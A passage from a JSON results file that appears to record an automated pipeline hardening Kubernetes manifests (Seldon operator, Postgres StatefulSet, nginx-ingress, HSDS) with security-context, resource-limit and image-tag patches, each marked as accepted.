ENGINE_SERVER_PORT\n          value: '8000'\n        - name: ENGINE_PROMETHEUS_PATH\n          value: /prometheus\n        - name: ISTIO_ENABLED\n          value: 'true'\n        - name: KEDA_ENABLED\n          value: 'false'\n        - name: ISTIO_GATEWAY\n          value: kubeflow/kubeflow-gateway\n        - name: ISTIO_TLS_MODE\n          value: ''\n        - name: USE_EXECUTOR\n          value: 'true'\n        - name: EXECUTOR_CONTAINER_IMAGE_AND_VERSION\n          value: uhub.service.ucloud.cn/a4x-kubeflow/seldonio/seldon-core-executor:1.4.0\n        - name: EXECUTOR_CONTAINER_IMAGE_PULL_POLICY\n          value: IfNotPresent\n        - name: EXECUTOR_PROMETHEUS_PATH\n          value: /prometheus\n        - name: EXECUTOR_SERVER_PORT\n          value: '8000'\n        - name: EXECUTOR_CONTAINER_USER\n          value: '8888'\n        - name: EXECUTOR_CONTAINER_SERVICE_ACCOUNT_NAME\n          value: default\n        - name: EXECUTOR_SERVER_METRICS_PORT_NAME\n          value: metrics\n        - name: EXECUTOR_REQUEST_LOGGER_DEFAULT_ENDPOINT\n          value: http://default-broker\n        - name: DEFAULT_USER_ID\n          value: '8888'\n        - name: EXECUTOR_DEFAULT_CPU_REQUEST\n          value: 500m\n        - name: EXECUTOR_DEFAULT_MEMORY_REQUEST\n          value: 512Mi\n        - name: EXECUTOR_DEFAULT_CPU_LIMIT\n          value: 500m\n        - name: EXECUTOR_DEFAULT_MEMORY_LIMIT\n          value: 512Mi\n        - name: ENGINE_DEFAULT_CPU_REQUEST\n          value: 500m\n        - name: ENGINE_DEFAULT_MEMORY_REQUEST\n          value: 512Mi\n        - name: ENGINE_DEFAULT_CPU_LIMIT\n          value: 500m\n        - name: ENGINE_DEFAULT_MEMORY_LIMIT\n          value: 512Mi\n        image: uhub.service.ucloud.cn/a4x-kubeflow/seldonio/seldon-core-operator:1.4.0\n        imagePullPolicy: IfNotPresent\n        name: manager\n        ports:\n        - containerPort: 8443\n          name: webhook-server\n          protocol: TCP\n        - containerPort: 8080\n          name: metrics\n          protocol: TCP\n        resources:\n          limits:\n            cpu: 500m\n            memory: 300Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - mountPath: /tmp/k8s-webhook-server/serving-certs\n          name: cert\n          readOnly: true\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      serviceAccountName: seldon-manager\n      volumes:\n      - name: cert\n        secret:\n          defaultMode: 420\n          secretName: seldon-webhook-server-cert\n",
    "errors": []
  },
  {
    "id": "01611",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: seldon\n    app.kubernetes.io/component: seldon\n    app.kubernetes.io/instance: seldon-core\n    app.kubernetes.io/name: seldon-core-operator\n    app.kubernetes.io/version: 1.4.0\n    control-plane: seldon-controller-manager\n  name: seldon-controller-manager\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: seldon\n      app.kubernetes.io/component: seldon\n      app.kubernetes.io/instance: seldon1\n      app.kubernetes.io/name: seldon-core-operator\n      app.kubernetes.io/version: v0.5\n      control-plane: seldon-controller-manager\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: seldon\n        app.kubernetes.io/component: seldon\n        app.kubernetes.io/instance: seldon1\n        app.kubernetes.io/name: seldon-core-operator\n        app.kubernetes.io/version: v0.5\n        control-plane: seldon-controller-manager\n    spec:\n      containers:\n      - args:\n        - --enable-leader-election\n        - --webhook-port=8443\n        - --create-resources=$(MANAGER_CREATE_RESOURCES)\n        - ''\n        command:\n        - /manager\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: RELATED_IMAGE_EXECUTOR\n          value: ''\n        - name: RELATED_IMAGE_ENGINE\n          value: ''\n        - name: RELATED_IMAGE_STORAGE_INITIALIZER\n          value: ''\n        - name: RELATED_IMAGE_SKLEARNSERVER_REST\n          value: ''\n        - name: RELATED_IMAGE_SKLEARNSERVER_GRPC\n          value: ''\n        - name: RELATED_IMAGE_XGBOOSTSERVER_REST\n          value: ''\n        - name: RELATED_IMAGE_XGBOOSTSERVER_GRPC\n          value: ''\n        - name: RELATED_IMAGE_MLFLOWSERVER_REST\n          value: ''\n        - name: RELATED_IMAGE_MLFLOWSERVER_GRPC\n          value: ''\n        - name: RELATED_IMAGE_TFPROXY_REST\n          value: ''\n        - name: RELATED_IMAGE_TFPROXY_GRPC\n          value: ''\n        - name: RELATED_IMAGE_TENSORFLOW\n          value: ''\n        - name: RELATED_IMAGE_EXPLAINER\n          value: ''\n        - name: RELATED_IMAGE_MOCK_CLASSIFIER\n          value: ''\n        - name: MANAGER_CREATE_RESOURCES\n          value: 'false'\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONTROLLER_ID\n          value: ''\n        - name: AMBASSADOR_ENABLED\n          value: 'true'\n        - name: AMBASSADOR_SINGLE_NAMESPACE\n          value: 'false'\n        - name: ENGINE_CONTAINER_IMAGE_AND_VERSION\n          value: uhub.service.ucloud.cn/a4x-kubeflow/seldonio/engine:1.4.0\n        - name: ENGINE_CONTAINER_IMAGE_PULL_POLICY\n          value: IfNotPresent\n        - name: ENGINE_CONTAINER_SERVICE_ACCOUNT_NAME\n          value: default\n        - name: ENGINE_CONTAINER_USER\n          value: '8888'\n        - name: ENGINE_LOG_MESSAGES_EXTERNALLY\n          value: 'false'\n        - name: PREDICTIVE_UNIT_SERVICE_PORT\n          value: '9000'\n        - name: PREDICTIVE_UNIT_DEFAULT_ENV_SECRET_REF_NAME\n          valueFrom:\n            secretKeyRef:\n              name: seldon-webhook-server-cert\n              key: predictive_unit_default_env_secret_ref_name\n        - name: PREDICTIVE_UNIT_METRICS_PORT_NAME\n          value: metrics\n        - name: ENGINE_SERVER_GRPC_PORT\n          value: '5001'\n        - name: ENGINE_SERVER_PORT\n          value: '8000'\n        - name: ENGINE_PROMETHEUS_PATH\n          value: /prometheus\n        - name: ISTIO_ENABLED\n          value: 'true'\n        - name: KEDA_ENABLED\n          value: 'false'\n        - name: ISTIO_GATEWAY\n          value: kubeflow/kubeflow-gateway\n        - name: ISTIO_TLS_MODE\n          value: ''\n        - name: USE_EXECUTOR\n          value: 'true'\n        - name: EXECUTOR_CONTAINER_IMAGE_AND_VERSION\n          value: uhub.service.ucloud.cn/a4x-kubeflow/seldonio/seldon-core-executor:1.4.0\n        - name: EXECUTOR_CONTAINER_IMAGE_PULL_POLICY\n          value: IfNotPresent\n        - name: EXECUTOR_PROMETHEUS_PATH\n          value: /prometheus\n        - name: EXECUTOR_SERVER_PORT\n          value: '8000'\n        - name: EXECUTOR_CONTAINER_USER\n          value: '8888'\n        - name: EXECUTOR_CONTAINER_SERVICE_ACCOUNT_NAME\n          value: default\n        - name: EXECUTOR_SERVER_METRICS_PORT_NAME\n          value: metrics\n        - name: EXECUTOR_REQUEST_LOGGER_DEFAULT_ENDPOINT\n          value: http://default-broker\n        - name: DEFAULT_USER_ID\n          value: '8888'\n        - name: EXECUTOR_DEFAULT_CPU_REQUEST\n          value: 500m\n        - name: EXECUTOR_DEFAULT_MEMORY_REQUEST\n          value: 512Mi\n        - name: EXECUTOR_DEFAULT_CPU_LIMIT\n          value: 500m\n        - name: EXECUTOR_DEFAULT_MEMORY_LIMIT\n          value: 512Mi\n        - name: ENGINE_DEFAULT_CPU_REQUEST\n          value: 500m\n        - name: ENGINE_DEFAULT_MEMORY_REQUEST\n          value: 512Mi\n        - name: ENGINE_DEFAULT_CPU_LIMIT\n          value: 500m\n        - name: ENGINE_DEFAULT_MEMORY_LIMIT\n          value: 512Mi\n        image: uhub.service.ucloud.cn/a4x-kubeflow/seldonio/seldon-core-operator:1.4.0\n        imagePullPolicy: IfNotPresent\n        name: manager\n        ports:\n        - containerPort: 8443\n          name: webhook-server\n          protocol: TCP\n        - containerPort: 8080\n          name: metrics\n          protocol: TCP\n        resources:\n          limits:\n            cpu: 500m\n            memory: 300Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - mountPath: /tmp/k8s-webhook-server/serving-certs\n          name: cert\n          readOnly: true\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      serviceAccountName: seldon-manager\n      volumes:\n      - name: cert\n        secret:\n          defaultMode: 420\n          secretName: seldon-webhook-server-cert\n",
    "errors": []
  },
  {
    "id": "01612",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: postgres-statefulset\n  namespace: default\n  labels:\n    app: postgres\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: postgres\n  template:\n    metadata:\n      labels:\n        app: postgres\n    spec:\n      containers:\n      - name: postgres\n        image: postgres:12\n        env:\n        - name: POSTGRES_DB\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: db\n        - name: POSTGRES_USER\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: user\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: password\n        ports:\n        - containerPort: 5432\n          name: postgresdb\n        volumeMounts:\n        - name: data\n          mountPath: /data\n          subPath: postgres\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: postgres-pvc\n",
    "errors": []
  },
  {
    "id": "01613",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: postgres-statefulset\n  namespace: default\n  labels:\n    app: postgres\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: postgres\n  template:\n    metadata:\n      labels:\n        app: postgres\n    spec:\n      containers:\n      - name: postgres\n        image: postgres:12\n        env:\n        - name: POSTGRES_DB\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: db\n        - name: POSTGRES_USER\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: user\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: password\n        ports:\n        - containerPort: 5432\n          name: postgresdb\n        volumeMounts:\n        - name: data\n          mountPath: /data\n          subPath: postgres\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: postgres-pvc\n",
    "errors": []
  },
  {
    "id": "01614",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: postgres-statefulset\n  namespace: default\n  labels:\n    app: postgres\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: postgres\n  template:\n    metadata:\n      labels:\n        app: postgres\n    spec:\n      containers:\n      - name: postgres\n        image: postgres:12\n        env:\n        - name: POSTGRES_DB\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: db\n        - name: POSTGRES_USER\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: user\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: password\n        ports:\n        - containerPort: 5432\n          name: postgresdb\n        volumeMounts:\n        - name: data\n          mountPath: /data\n          subPath: postgres\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: postgres-pvc\n",
    "errors": []
  },
  {
    "id": "01615",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: postgres-statefulset\n  namespace: default\n  labels:\n    app: postgres\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: postgres\n  template:\n    metadata:\n      labels:\n        app: postgres\n    spec:\n      containers:\n      - name: postgres\n        image: postgres:12\n        env:\n        - name: POSTGRES_DB\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: db\n        - name: POSTGRES_USER\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: user\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: postgres\n              key: password\n        ports:\n        - containerPort: 5432\n          name: postgresdb\n        volumeMounts:\n        - name: data\n          mountPath: /data\n          subPath: postgres\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: postgres-pvc\n",
    "errors": []
  },
  {
    "id": "01616",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-ingress\n  namespace: nginx-ingress\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx-ingress\n  template:\n    metadata:\n      labels:\n        app: nginx-ingress\n    spec:\n      serviceAccountName: nginx-ingress\n      containers:\n      - image: nginx/nginx-ingress:edge\n        imagePullPolicy: Always\n        name: nginx-ingress\n        ports:\n        - name: http\n          containerPort: 80\n        - name: https\n          containerPort: 443\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        args:\n        - -nginx-configmaps=$(POD_NAMESPACE)/nginx-config\n        - -ingress-class=nginx-ingress\n        - -default-server-tls-secret=$(POD_NAMESPACE)/default-server-secret\n        - -external-service=nginx-ingress\n        - -report-ingress-status\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01617",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-ingress\n  namespace: nginx-ingress\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx-ingress\n  template:\n    metadata:\n      labels:\n        app: nginx-ingress\n    spec:\n      serviceAccountName: nginx-ingress\n      containers:\n      - image: nginx/nginx-ingress:edge\n        imagePullPolicy: Always\n        name: nginx-ingress\n        ports:\n        - name: http\n          containerPort: 80\n        - name: https\n          containerPort: 443\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        args:\n        - -nginx-configmaps=$(POD_NAMESPACE)/nginx-config\n        - -ingress-class=nginx-ingress\n        - -default-server-tls-secret=$(POD_NAMESPACE)/default-server-secret\n        - -external-service=nginx-ingress\n        - -report-ingress-status\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01618",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-ingress\n  namespace: nginx-ingress\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx-ingress\n  template:\n    metadata:\n      labels:\n        app: nginx-ingress\n    spec:\n      serviceAccountName: nginx-ingress\n      containers:\n      - image: nginx/nginx-ingress:edge\n        imagePullPolicy: Always\n        name: nginx-ingress\n        ports:\n        - name: http\n          containerPort: 80\n        - name: https\n          containerPort: 443\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        args:\n        - -nginx-configmaps=$(POD_NAMESPACE)/nginx-config\n        - -ingress-class=nginx-ingress\n        - -default-server-tls-secret=$(POD_NAMESPACE)/default-server-secret\n        - -external-service=nginx-ingress\n        - -report-ingress-status\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01619",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-ingress\n  namespace: nginx-ingress\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx-ingress\n  template:\n    metadata:\n      labels:\n        app: nginx-ingress\n    spec:\n      serviceAccountName: nginx-ingress\n      containers:\n      - image: nginx/nginx-ingress:edge\n        imagePullPolicy: Always\n        name: nginx-ingress\n        ports:\n        - name: http\n          containerPort: 80\n        - name: https\n          containerPort: 443\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        args:\n        - -nginx-configmaps=$(POD_NAMESPACE)/nginx-config\n        - -ingress-class=nginx-ingress\n        - -default-server-tls-secret=$(POD_NAMESPACE)/default-server-secret\n        - -external-service=nginx-ingress\n        - -report-ingress-status\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01620",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9975\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01621",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9975\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01622",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9975\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01623",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9975\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01624",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9975\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01625",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: sn\n        image: hdfgroup/hsds:stable\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          valueFrom:\n            secretKeyRef:\n              name: user-password\n              key: password_file\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        - name: AZURE_APP_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_app_id\n        - name: AZURE_RESOURCE_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_resource_id\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - name: dn\n        image: hdfgroup/hsds:stable\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n      - name: override\n        configMap:\n          name: hsds-override\n",
    "errors": []
  },
  {
    "id": "01626",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: sn\n        image: hdfgroup/hsds:stable\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          valueFrom:\n            secretKeyRef:\n              name: user-password\n              key: password_file\n        - name: AZURE_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: azure-conn-str\n              key: az_conn_str\n        - name: AZURE_APP_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_app_id\n        - name: AZURE_RESOURCE_ID\n          valueFrom:\n            secretKeyRef:\n              name: azure-ad-ids\n              key: az_resource_id\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - name: dn\n        image: hdfgroup/hsds:stable\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: config\n          mountPath: /config/config.yml\n          subPath: config.yml\n        - name: override\n          mountPath: /config/override.yml\n          subPath: override.yml\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: 